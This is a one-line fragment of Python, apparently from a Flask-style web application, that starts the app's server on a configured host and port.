    app.run(host=HOST, port=PORT)
